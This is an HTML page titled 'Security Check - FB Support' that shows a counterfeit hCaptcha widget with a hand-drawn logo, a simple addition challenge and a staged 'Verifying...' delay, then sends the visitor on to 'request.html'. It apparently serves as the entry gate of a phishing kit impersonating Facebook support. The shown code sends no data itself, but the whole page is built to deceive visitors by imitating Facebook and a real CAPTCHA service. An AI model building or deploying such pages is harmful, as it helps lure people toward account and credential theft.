<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check - FB Support</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #f3f4f6;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .security-card {
            width: 100%;
            max-width: 400px;
            background-color: white;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
            padding: 32px 24px;
        }

        .card-title {
            font-size: 20px;
            font-weight: 600;
            color: #111827;
            text-align: center;
            margin-bottom: 24px;
        }

        .card-text {
            font-size: 14px;
            color: #6b7280;
            line-height: 1.5;
            text-align: center;
            margin-bottom: 16px;
        }

        .card-instruction {
            font-size: 14px;
            color: #374151;
            font-weight: 500;
            text-align: center;
            margin-bottom: 24px;
        }

        /* CAPTCHA Widget */
        .captcha-widget {
            border: 1px solid #e5e7eb;
            border-radius: 8px;
            padding: 16px;
            background-color: #f9fafb;
            margin-bottom: 24px;
        }

        .captcha-content {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .captcha-left {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .checkbox-container {
            position: relative;
        }

        .checkbox {
            width: 24px;
            height: 24px;
            border: 2px solid #d1d5db;
            border-radius: 4px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: white;
            transition: all 0.2s;
        }

        .checkbox.loading {
            background-color: #f3f4f6;
            border-color: #3b82f6;
            cursor: not-allowed;
        }

        .checkbox.checked {
            background-color: #3b82f6;
            border-color: #3b82f6;
        }

        .checkbox.checked::after {
            content: 'âœ“';
            color: white;
            font-size: 14px;
            font-weight: bold;
        }

        /* Loading Spinner */
        .spinner {
            width: 16px;
            height: 16px;
            border: 2px solid #e5e7eb;
            border-top: 2px solid #3b82f6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .checkbox-label {
            font-size: 14px;
            font-weight: 500;
            color: #374151;
            cursor: pointer;
            user-select: none;
            transition: color 0.2s;
        }

        .checkbox-label.disabled {
            color: #9ca3af;
            cursor: not-allowed;
        }

        .captcha-right {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .hcaptcha-logo {
            width: 32px;
            height: 32px;
            background-color: #14b8a6;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 4px;
        }

        .hcaptcha-logo::after {
            content: '';
            width: 16px;
            height: 16px;
            background-color: white;
            border-radius: 2px;
        }

        .hcaptcha-text {
            font-size: 12px;
            font-weight: 500;
            color: #374151;
            margin-bottom: 2px;
        }

        .hcaptcha-links {
            font-size: 10px;
            color: #9ca3af;
        }

        /* Math Challenge Modal */
        .math-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }

        .math-modal.show {
            display: flex;
        }

        .math-content {
            background: white;
            border-radius: 12px;
            padding: 24px;
            max-width: 300px;
            width: 90%;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
        }

        .math-title {
            font-size: 18px;
            font-weight: 600;
            color: #111827;
            margin-bottom: 16px;
        }

        .math-question {
            font-size: 24px;
            font-weight: 700;
            color: #3b82f6;
            margin-bottom: 16px;
        }

        .math-input {
            width: 100%;
            padding: 12px;
            border: 2px solid #e5e7eb;
            border-radius: 8px;
            font-size: 16px;
            text-align: center;
            margin-bottom: 16px;
            outline: none;
            transition: border-color 0.2s;
        }

        .math-input:focus {
            border-color: #3b82f6;
        }

        .math-input.error {
            border-color: #ef4444;
            background-color: #fef2f2;
        }

        .math-buttons {
            display: flex;
            gap: 12px;
        }

        .math-btn {
            flex: 1;
            padding: 10px 16px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
        }

        .math-btn.submit {
            background-color: #3b82f6;
            color: white;
        }

        .math-btn.submit:hover {
            background-color: #2563eb;
        }

        .math-btn.cancel {
            background-color: #f3f4f6;
            color: #374151;
        }

        .math-btn.cancel:hover {
            background-color: #e5e7eb;
        }

        .error-message {
            color: #ef4444;
            font-size: 12px;
            margin-top: 8px;
            display: none;
        }

        /* Continue Button */
        .continue-btn {
            width: 100%;
            padding: 12px 24px;
            background-color: #3b82f6;
            color: white;
            border: none;
            border-radius: 25px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
        }

        .continue-btn:hover:not(:disabled) {
            background-color: #2563eb;
        }

        .continue-btn:disabled {
            background-color: #9ca3af;
            cursor: not-allowed;
        }

        @media (max-width: 480px) {
            .security-card {
                padding: 24px 20px;
                margin: 10px;
            }
            
            .card-title {
                font-size: 18px;
            }
        }
    </style>
</head>
<body>
    <div class="security-card">
        <h1 class="card-title">Security Check</h1>
        
        <p class="card-text">
            This Site uses security checks to ensure the people accessing this site are real. Please complete the CAPTCHA below to continue.
        </p>
        
        <p class="card-instruction">
            Before you proceed, please complete the CAPTCHA below.
        </p>

        <!-- CAPTCHA Widget -->
        <div class="captcha-widget">
            <div class="captcha-content">
                <div class="captcha-left">
                    <div class="checkbox-container">
                        <div class="checkbox" id="humanCheck"></div>
                    </div>
                    <label for="humanCheck" class="checkbox-label" id="checkboxLabel">I am human</label>
                </div>
                <div class="captcha-right">
                    <div class="hcaptcha-logo"></div>
                    <div class="hcaptcha-text">hCaptcha</div>
                    <div class="hcaptcha-links">Privacy - Terms</div>
                </div>
            </div>
        </div>

        <button class="continue-btn" id="continueBtn" disabled>Continue</button>
    </div>

    <!-- Math Challenge Modal -->
    <div class="math-modal" id="mathModal">
        <div class="math-content">
            <h3 class="math-title">Verify you're human</h3>
            <div class="math-question" id="mathQuestion">2 + 7 = ?</div>
            <input type="number" class="math-input" id="mathInput" placeholder="Enter your answer">
            <div class="error-message" id="errorMessage">Incorrect answer. Please try again.</div>
            <div class="math-buttons">
                <button class="math-btn cancel" id="cancelBtn">Cancel</button>
                <button class="math-btn submit" id="submitBtn">Submit</button>
            </div>
        </div>
    </div>

    <script>
        const checkbox = document.getElementById('humanCheck');
        const checkboxLabel = document.getElementById('checkboxLabel');
        const continueBtn = document.getElementById('continueBtn');
        const mathModal = document.getElementById('mathModal');
        const mathQuestion = document.getElementById('mathQuestion');
        const mathInput = document.getElementById('mathInput');
        const submitBtn = document.getElementById('submitBtn');
        const cancelBtn = document.getElementById('cancelBtn');
        const errorMessage = document.getElementById('errorMessage');
        
        let isChecked = false;
        let isLoading = false;
        let currentAnswer = 0;

        // Math problems array
        const mathProblems = [
            { question: "2 + 7", answer: 9 },
            { question: "3 + 9", answer: 12 },
            { question: "5 + 4", answer: 9 },
            { question: "8 + 6", answer: 14 },
            { question: "7 + 3", answer: 10 },
            { question: "4 + 8", answer: 12 },
            { question: "9 + 2", answer: 11 },
            { question: "6 + 5", answer: 11 },
            { question: "1 + 9", answer: 10 },
            { question: "3 + 6", answer: 9 }
        ];

        function getRandomMathProblem() {
            const problem = mathProblems[Math.floor(Math.random() * mathProblems.length)];
            return problem;
        }

        // Handle checkbox click
        checkbox.addEventListener('click', function() {
            if (isLoading || isChecked) return;
            
            // Show math challenge
            const problem = getRandomMathProblem();
            mathQuestion.textContent = problem.question + " = ?";
            currentAnswer = problem.answer;
            mathInput.value = '';
            mathInput.classList.remove('error');
            errorMessage.style.display = 'none';
            mathModal.classList.add('show');
            mathInput.focus();
        });

        // Handle submit button
        submitBtn.addEventListener('click', function() {
            const userAnswer = parseInt(mathInput.value);
            
            if (userAnswer === currentAnswer) {
                // Correct answer - start loading
                mathModal.classList.remove('show');
                startLoading();
            } else {
                // Wrong answer
                mathInput.classList.add('error');
                errorMessage.style.display = 'block';
                mathInput.value = '';
                mathInput.focus();
            }
        });

        // Handle cancel button
        cancelBtn.addEventListener('click', function() {
            mathModal.classList.remove('show');
        });

        // Handle Enter key in math input
        mathInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                submitBtn.click();
            }
        });

        // Handle Escape key to close modal
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape' && mathModal.classList.contains('show')) {
                mathModal.classList.remove('show');
            }
        });

        function startLoading() {
            isLoading = true;
            checkbox.classList.add('loading');
            checkboxLabel.classList.add('disabled');
            checkboxLabel.textContent = 'Verifying...';
            
            // Add spinner
            const spinner = document.createElement('div');
            spinner.className = 'spinner';
            checkbox.appendChild(spinner);
            
            // After 2 seconds, complete the verification
            setTimeout(function() {
                // Remove spinner and loading state
                checkbox.removeChild(spinner);
                checkbox.classList.remove('loading');
                checkbox.classList.add('checked');
                checkboxLabel.classList.remove('disabled');
                checkboxLabel.textContent = 'I am human';
                
                // Mark as checked and enable continue button
                isChecked = true;
                isLoading = false;
                continueBtn.disabled = false;
            }, 2000);
        }

        // Handle continue button click
        continueBtn.addEventListener('click', function() {
            if (isChecked) {
                // Direct redirect without showing "Redirecting..."
                window.location.href = 'request.html';
            }
        });

        // Handle label click
        checkboxLabel.addEventListener('click', function() {
            if (!isLoading && !isChecked) {
                checkbox.click();
            }
        });
    </script>
</body>
</html>
